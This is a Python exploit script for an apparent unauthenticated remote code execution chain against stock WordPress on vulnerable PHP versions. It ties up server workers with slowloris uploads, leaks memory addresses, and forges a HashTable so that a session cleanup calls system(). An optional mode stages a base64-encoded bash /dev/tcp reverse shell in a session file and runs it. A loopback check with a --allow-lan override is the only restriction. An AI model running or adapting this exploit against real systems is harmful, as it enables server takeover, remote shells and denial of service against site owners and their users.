#!/usr/bin/env python3
"""php2shell_wp - unauthenticated RCE on STOCK multi-worker WordPress.

CVE-2026-109618 / CVE-2026-109619 (PHP <= 8.4.26 session.upload_progress).
Full chain, pure display_errors=Off, ASLR on, default prefork pool:

  1. SATURATE   hold MaxRequestWorkers-1 children with slowloris chunked
                uploads, so one free worker serves the whole sequence
                (deterministic producer/consumer colocation).
  2. LEAK       display-off OOM-in-cookie: a calibrated fill drives real_size
                to memory_limit exactly at the session cookie's url_encode,
                dangling PS(id) with send_cookie=1; a forged 600 KB window
                consumer (on a cheap PHP stub so it survives WP's compile)
                dumps both the Zend-MM chunk base and the libphp base in one
                Set-Cookie.
  3. FIRE       reoccupy the OOM-dangled PS(http_session_vars) with a fake
                zend_reference -> fake HashTable(pDestructor=zif_system); the
                session cleanup runs system(cmd).

Engine (Leak/Fire/Endpoint/decode_bases) lives in engine.py next to this file.
Lab use only; target must be loopback unless --allow-lan.

usage:
  python3 php2shell_wp.py --url http://127.0.0.1:8080/wp-content/index.php \
      --blockers 149 --table-off 0x690d8 --cmd 'id>/tmp/p'
"""
import argparse, base64, socket, sys, threading, time, urllib.parse
import engine as S

ZIF, DTOR = 0x465370, 0x65eb60
# Per-image fake-HashTable landing (ASLR-on, php2shell-lab-wp / php:8.4.26).
# Stable across boots of the same image; recalibrate per image (calibrate.sh)
# or use --sweep-table to brute the dense spray block over HTTP.
DEFAULT_TABLE_OFF = 0x690d8
SWEEP_STEP = 0xc0


def run_blockers(host, port, n, stop):
    """n slowloris chunked POSTs that never finish, pinning n workers busy."""
    def one():
        s = None
        try:
            s = socket.create_connection((host, port), 30)
            s.settimeout(10)
            bnd = b"Z" * 10
            s.sendall(b"POST /index.php HTTP/1.1\r\nHost: %s:%d\r\n"
                      b"Content-Type: multipart/form-data; boundary=%s\r\n"
                      b"Transfer-Encoding: chunked\r\n\r\n"
                      % (host.encode(), port, bnd))
            first = b"--" + bnd + b"\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n"
            s.sendall(b"%X\r\n" % len(first) + first + b"\r\n")
            while not stop.is_set():
                s.sendall(b"100\r\n" + b"A" * 0x100 + b"\r\n")
                time.sleep(0.3)
        except OSError:
            pass
        finally:
            try:
                s and s.close()
            except Exception:
                pass
    ts = []
    for _ in range(n):
        t = threading.Thread(target=one, daemon=True)
        t.start(); ts.append(t); time.sleep(0.01)
    return ts


def fire_once(fire, heap, module, cmd, table_off):
    fire.rotate()
    fire.run(heap, module, cmd, table_offset=table_off, cookie="a" * 32,
             spray=15, live_n=0, live_len=31, fill_n=0, carrier_mode="adopted",
             progress_late=False, pads=S.parse_pads(""), decoy_n=2)
    time.sleep(0.6)


def revshell_payload(lhost, lport):
    rs = "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (lhost, lport)
    return "<?php system(base64_decode('%s'));?>" % base64.b64encode(rs.encode()).decode()


def stalled_plant(host, port, payload, stop, sid="0"):
    """Stage the PHP payload into /tmp/sess_<sid> via a held upload_progress POST.
    The upload never completes, so cleanup doesn't run and the session keeps the
    payload; a trickle keeps the connection (and one worker) alive."""
    b = "PLANT"
    prefix = ('--%s\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n'
              '--%s\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
              '--%s\r\nContent-Disposition: form-data; name="f"; filename="%s"\r\n\r\n'
              % (b, sid, b, b, payload)).encode()
    first = prefix + b"Z" * 6000
    cl = len(first) + 500000
    req = ("POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nCookie: PHPSESSID=%s\r\nConnection: close\r\n\r\n"
           % (host, b, cl, sid)).encode() + first
    s = socket.create_connection((host, port), 30); s.sendall(req)

    def trick():
        while not stop.is_set():
            try:
                s.sendall(b"Z")
            except Exception:
                break
            time.sleep(2)
    threading.Thread(target=trick, daemon=True).start()
    return s


def revshell_run(host, port, args):
    """Reverse shell: stage a PHP payload in a session, fire `php /tmp/s*` (11
    bytes) to run it. Needs save_path=/tmp (stock) and sess_0 to sort first under
    /tmp/s*. Holds one worker for the payload session, so it uses blockers-1."""
    stop = threading.Event()
    nb = max(0, args.blockers - 1)
    print("[*] saturating pool with %d blockers (+1 worker held for the payload session)" % nb, flush=True)
    run_blockers(host, port, nb, stop)
    time.sleep(2)
    stalled_plant(host, port, revshell_payload(args.lhost, args.lport), stop)
    time.sleep(1.5)
    print("[*] payload session staged; reverse shell -> %s:%s (start your listener)" % (args.lhost, args.lport), flush=True)
    http = S.Endpoint(args.url, 90.0)
    heap, module = S.Leak(http, DTOR, True).run(args.leak_tries)
    if not heap or not module:
        stop.set(); print("[-] LEAK FAILED"); return 1
    print("[+] LEAK chunk=%#x libphp=%#x" % (heap, module), flush=True)
    fire = S.Fire(http, ZIF, DTOR, True)
    for i in range(1, args.fire_tries + 1):
        fire_once(fire, heap, module, b"php /tmp/s*", args.table_off)
        print("[*] fired php /tmp/s* (%d/%d)" % (i, args.fire_tries), flush=True)
    stop.set(); time.sleep(0.3)
    print("[+] done; on a landed fire bash connected back to %s:%s" % (args.lhost, args.lport))
    return 0


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="cheap PHP stub, e.g. .../wp-content/index.php")
    ap.add_argument("--cmd", default="id>/tmp/p", help="command, <=14 bytes")
    ap.add_argument("--blockers", type=int, default=149,
                    help="MaxRequestWorkers-1 (default 149 for the 150 pool)")
    ap.add_argument("--table-off", type=lambda v: int(v, 0), default=DEFAULT_TABLE_OFF)
    ap.add_argument("--sweep-table", action="store_true",
                    help="brute the fake-HT landing over the dense spray block")
    ap.add_argument("--sweep-span", type=lambda v: int(v, 0), default=0x3000)
    ap.add_argument("--leak-tries", type=int, default=3)
    ap.add_argument("--fire-tries", type=int, default=6)
    ap.add_argument("--allow-lan", action="store_true")
    ap.add_argument("--lhost", help="reverse shell: your listener IP (stages a session + fires php /tmp/s*)")
    ap.add_argument("--lport", default="4444", help="reverse shell: your listener port")
    args = ap.parse_args()

    u = urllib.parse.urlsplit(args.url)
    host, port = u.hostname, (u.port or 80)
    if host not in ("127.0.0.1", "localhost", "::1") and not args.allow_lan:
        sys.exit("refusing non-loopback target without --allow-lan")

    if args.lhost:
        return revshell_run(host, port, args)

    cmd = args.cmd.encode()
    if not cmd or len(cmd) > 14 or b"\0" in cmd:
        sys.exit("--cmd must be 1-14 bytes, no NUL")

    stop = threading.Event()
    print(f"[*] saturating pool with {args.blockers} blockers", flush=True)
    run_blockers(host, port, args.blockers, stop)
    time.sleep(2.0)

    http = S.Endpoint(args.url, 90.0)
    heap, module = S.Leak(http, DTOR, True).run(args.leak_tries)
    if not heap or not module:
        stop.set(); sys.exit("[-] LEAK FAILED")
    print(f"[+] LEAK chunk={heap:#x} libphp={module:#x}", flush=True)

    fire = S.Fire(http, ZIF, DTOR, True)
    offs = ([args.table_off] if not args.sweep_table else
            list(range(args.table_off - args.sweep_span,
                       args.table_off + args.sweep_span + 1, SWEEP_STEP)))
    for off in offs:
        for att in range(1, args.fire_tries + 1):
            fire_once(fire, heap, module, cmd, off)
            print(f"[*] fired table_off={off:#x} attempt {att}", flush=True)
    stop.set(); time.sleep(0.4)
    print(f"[+] done. chunk={heap:#x} libphp={module:#x} - verify the command result")


if __name__ == "__main__":
    main()
